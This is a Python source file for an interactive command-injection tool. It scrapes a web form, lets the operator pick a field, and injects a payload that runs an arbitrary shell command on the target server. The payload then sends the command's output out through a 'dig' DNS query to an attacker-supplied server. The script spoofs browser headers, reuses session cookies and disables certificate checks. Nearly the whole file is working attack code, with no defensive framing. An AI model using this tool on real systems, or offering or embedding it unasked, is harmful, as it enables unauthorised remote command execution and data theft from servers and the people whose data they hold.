import requests
import argparse
import urllib.parse
import urllib3  
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_command(command, server_ip, server_port):
    """
    Encode the command for URL and DNS exfiltration.
    """
    command_part = f"; a=$({command})"
    dns_query = f"dig @{server_ip} -p {server_port} $a"
    # Encode the entire command string
    encoded_command = urllib.parse.quote(command_part + ";" + dns_query)
    return encoded_command

def send_request(url, method, payload, headers, cookies=None, proxy=None):
    """
    Send an HTTP request with the given parameters.
    """
    verify = False  # Disable SSL certificate verification

    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy,
        }

    if method.upper() == 'POST':
        response = requests.post(url, data=payload, headers=headers, cookies=cookies, verify=verify, proxies=proxies)
    elif method.upper() == 'GET':
        response = requests.get(url, params=payload, headers=headers, cookies=cookies, verify=verify, proxies=proxies)
    else:
        print("Unsupported HTTP method")
        return None

    return response

def get_form_fields_and_cookies(url):
    """
    Fetch the form fields from the URL and return a dictionary with field names and default values,
    including both <input> and <textarea> fields, along with the action URL for form submission
    and any session cookies obtained from the request.
    """
    response = requests.get(url, verify=False)
    cookies = response.cookies  # Extract cookies from the response
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        print("No forms found on the page.")
        return {}, url, cookies

    form = forms[0]  # Assuming the first form is the target form
    fields = {}
    action_url = form.get('action', '')  # Get form action URL or default to empty string
    if not action_url.startswith('http'):
        action_url = urllib.parse.urljoin(url, action_url)  # Construct full URL if relative

    # Extracting input fields
    for input_tag in form.find_all('input'):
        name = input_tag.get('name')
        if name:
            # Set default values for text and password fields
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text')
            if input_type == 'text':
                fields[name] = 'default'  # Customize as needed
            elif input_type == 'password':
                fields[name] = 'password'
            elif input_type == 'email':
                fields[name] = 'none@none.ne'
            elif input_type == 'hidden':  # Keep existing values for hidden fields
                fields[name] = value
            else:
                fields[name] = value

    # Extracting textarea fields and setting default text
    for textarea in form.find_all('textarea'):
        name = textarea.get('name')
        if name:
            # Set a default value for textarea fields
            fields[name] = 'thisismymessage'  # Default text for textarea fields

    return fields, action_url, cookies


def prompt_if_missing(args, prompt_name, prompt_text, default_value=None):
    """
    Helper function to prompt for input if not provided in the command line arguments.
    """
    value = getattr(args, prompt_name)
    if value is None:
        # Prompt the user, using the default_value if provided
        if default_value:
            value = input(f"{prompt_text} (default: {default_value}): ").strip() or default_value
        else:
            value = input(prompt_text).strip()
    return value


def main():
    parser = argparse.ArgumentParser(description='Send a request to the vulnerable app with payload.')
    parser.add_argument('--url', type=str, help='The URL of the vulnerable application')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], help='HTTP method to use (GET or POST)')
    parser.add_argument('--proxy', type=str, help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--server_ip', type=str, help='DNS server IP for exfiltration')
    parser.add_argument('--server_port', type=str, help='DNS server port (e.g., 53 or 8053)')

    args = parser.parse_args()

    # Prompt for inputs that are not provided as command line arguments
    url = prompt_if_missing(args, 'url', "Enter the URL of the vulnerable application: ")
    method = prompt_if_missing(args, 'method', "Enter the HTTP method (GET or POST): ").upper()
    proxy = prompt_if_missing(args, 'proxy', "Enter the proxy URL (e.g., http://127.0.0.1:8080) or leave blank if not using: ").strip()
    server_ip = prompt_if_missing(args, 'server_ip', "Enter the DNS server IP for exfiltration: ")
    server_port = prompt_if_missing(args, 'server_port', "Enter the DNS server port (e.g., 53 or 8053)", default_value="53")

    # Get form fields, action URL, and session cookies from the form
    fields, action_url, cookies = get_form_fields_and_cookies(url)

    if not fields:
        print("No form fields to process.")
        return

    # Show form fields and allow selection for payload injection
    print("\nFound form fields:")
    for i, field in enumerate(fields):
        print(f"{i + 1}. {field}: {fields[field]}")

    inject_index = int(input("Enter the number of the field you want to inject the payload into: ")) - 1
    target_field = list(fields.keys())[inject_index]

    # Setting up headers to mimic a real browser request
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',  # Set to application/x-www-form-urlencoded
        'Origin': urllib.parse.urljoin(url, '/'),  # Base URL to match browser's behavior
        'Referer': url,
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    while True:
        command = input("Enter the payload command (e.g., whoami, ls /) or press Enter to exit: ")
        if not command:
            print("Exiting...")
            break

        # Encode the command and update the payload with encoded command
        encoded_command = encode_command(command, server_ip, server_port)

        # Inject payload into the selected field
        fields[target_field] = encoded_command

        # Manually construct the payload string to avoid double encoding
        payload_str = '&'.join(f"{k}={v}" for k, v in fields.items())

        # Send the request with cookies from the initial request
        response = send_request(action_url, method, payload_str, headers, cookies=cookies, proxy=proxy)

        if response:
            print("Request URL:", response.url)
            print("Response Code:", response.status_code)
            # Uncomment the line below if you need to print the response text
            # print("Response Text:", response.text)
        else:
            print("Failed to get a response.")

if __name__ == "__main__":
    main()
